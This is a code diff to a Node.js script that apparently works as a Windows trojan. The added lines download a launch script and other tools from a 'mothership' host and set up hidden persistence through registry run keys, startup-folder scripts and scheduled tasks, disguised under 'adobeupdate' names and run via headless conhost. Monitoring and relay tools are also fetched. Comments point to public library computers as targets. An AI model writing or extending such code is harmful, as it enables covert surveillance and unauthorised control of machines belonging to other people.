@@ -1,3 +1,5 @@
+debugger;
+
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
 // https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
 
@@ -141,6 +143,10 @@ var regstartupconfig = {
 
 var startupfolderconfig = {
     
+    get launcher_fname() {
+        return 'adobeupdate.cmd';
+    },
+
     getFolder(foldername) {
         this.folders.forEach( (folder) => {
             if ( folder.name == foldername )
@@ -159,7 +165,7 @@ var startupfolderconfig = {
     },
 
     getLauncherScript(foldername) {
-        return `conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd ${foldername}`;
+        return `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${foldername}`;
     },
 
     get foldernames() {
@@ -193,9 +199,19 @@ var startupfolderconfig = {
     ],
 };
 
+var systemconfig = {
+    get launch_script_fname() {
+        return systemstate.istpl ? 'tpl_launch.cmd' : 'launch.cmd';
+    }
+};
+
+// TODO move over static configurations to systemconfig
 var systemstate = {
     staticdelay: 30,
 
+    // TODO SJPCP --> st. james
+    //      RLPCP --> yonge/bloor reference library
+    //      username should be ADULT2022
     get istpl() {
         if (
             this.machinename.toLowerCase().substring(0, 5) ==
@@ -2758,11 +2774,12 @@ function cmdlist() {
 async function reschedule() {
     let tasknames = taskconfig.tasknames;
 
-    // let ptasknames = await getTasks();
-
     for (let i = 0; i < tasknames.length; i++) {
         let taskname = tasknames[i];
-        // anchor
+        
+        // TODO check if task does not exist before creating it
+        // schtasks /query /tn "MyTaskName"
+
         await createTask(taskname);
     }
 }
@@ -2806,25 +2823,49 @@ async function exec_ps_cmd(psScript) {
 async function penetrate_reg() {
     regstartupconfig.startup_name = 'adobeupdate_startup';
 
-    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hklm';
+    regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hklm`;
     await exec_ps_cmd(regstartupconfig.startup_hklm_script);
 
-    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hkcu'; 
+    regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hkcu`; 
     await exec_ps_cmd(regstartupconfig.startup_hkcu_script);
 
-    regstartupconfig.startup_value = 'conhost.exe --headless C:\\ProgramData\\owd\\launch.cmd startup_hku';
+    regstartupconfig.startup_value = `conhost.exe --headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} startup_hku`;
     await exec_ps_cmd(regstartupconfig.startup_hku_script);
 
     return;
 }
 
-async function penetrate_folders() {
+async function download_launch_script() {
+
+    let filename = systemconfig.launch_script_fname;
+    
+    let baseUrl = systemstate.mothershipassets + "/" + filename;
+    let localpath = path.join(systemstate.trojandir, filename);
+
+    let downloadOpts = {
+        download: true,
+        filetype: "bin",
+        localpath: localpath,
+    };
+
+    let response = await makeGetRequest(baseUrl, null, null, downloadOpts);
+
+    if (!fileExists(localpath)) {
+        throw new Error("download failed for " + localpath);
+    }
+
+    const stats = fs.statSync(localpath);
+    logmsg(`${localpath} -- File size: ${stats.size} bytes`);
+
+}
+
+function penetrate_folders() {
 
     let foldernames = startupfolderconfig.foldernames;
 
     for ( let i = 0; i<foldernames.length; i++) {
         let foldername = foldernames[i];
-        let fpath = path.join(startupfolderconfig.getFolderPath(foldername), 'adobeupdate.cmd');
+        let fpath = path.join(startupfolderconfig.getFolderPath(foldername), startupfolderconfig.launcher_fname);
         let script_txt = startupfolderconfig.getLauncherScript(foldername);
 
         logmsg(`writing launch script to ${fpath}`);
@@ -2836,13 +2877,18 @@ async function penetrate_folders() {
 async function penetrate() {
     logmsg("starting");
 
+    if ( ! fileExists(path.join(systemstate.trojandir, systemconfig.launch_script_fname)) ) {
+        await download_launch_script();
+    }
+
     await reschedule();
 
     await penetrate_reg();
 
     await penetrate_folders();
 
-    // TODO await cleanup() // check if trojandir needs cleanup, if so remove log files, etc.
+    // TODO await cleanup() 
+    // check if trojandir needs cleanup, if so remove log files, etc.
 
     logmsg("finished");
     process.exit(0);
@@ -3397,6 +3443,7 @@ async function retrieve() {
     logmsg("starting");
 
     let assets = [
+        systemconfig.launch_script_fname,
         "pythonrelay.py",
         "pc_monitoring.ps1",
         "nircmdc.exe",
@@ -3404,14 +3451,18 @@ async function retrieve() {
         "gunite.exe",
         "pcmon.dll",
         "pcmon.exe",
-        "pslist.exe",
-    ];
+        "pslist.exe"    ];
 
     for (let i = 0; i < assets.length; i++) {
         let fname = assets[i];
+        let localpath = path.join(systemstate.trojandir, fname);
+
         let baseUrl = systemstate.mothershipassets + "/" + fname;
 
-        let localpath = path.join(systemstate.trojandir, fname);
+        if ( fileExists(localpath) ) {
+            logmsg(`assets exists ${localpath} -- skipping `);
+            continue;
+        }
 
         let downloadOpts = {
             download: true,
@@ -3697,7 +3748,7 @@ async function createTask(taskname) {
     let taskxmlstrfunc = taskconfig.getTaskXMLFunc(taskname);
 
     let pexe = "conhost.exe";
-    let args = `--headless C:\\ProgramData\\owd\\launch.cmd ${taskname}`;
+    let args = `--headless C:\\ProgramData\\owd\\${systemconfig.launch_script_fname} ${taskname}`;
     let workdir = "C:\\ProgramData\\owd\\";
 
     let tasktime = ["RepTask", "TimeTask"].includes(taskname) ? "1" : "5";
